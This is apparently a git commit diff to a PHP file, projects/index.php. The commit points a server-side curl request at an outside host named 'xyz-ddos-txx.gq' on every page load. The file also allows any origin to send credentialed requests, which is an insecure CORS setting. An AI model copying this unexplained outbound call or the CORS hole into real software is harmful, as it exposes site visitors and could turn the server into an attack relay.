25b091e895c78ed1596779a938ee67670531a5ed
Việt Nguyễn Đức <nguyenducviet1998tk@gmail.com>
2018-12-04 13:54:10 +0700

    up

--- projects/index.php
+++ projects/index.php
@@ -2,7 +2,8 @@
 header('Access-Control-Allow-Credentials: true');
 header('Access-Control-Allow-Origin: *'); 
 $ch = curl_init(); 
-curl_setopt($ch, CURLOPT_URL, ""); 
+curl_setopt($ch, CURLOPT_URL, "http://xyz-ddos-txx.gq/?d="); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
 curl_exec($ch); 
+
 ?>
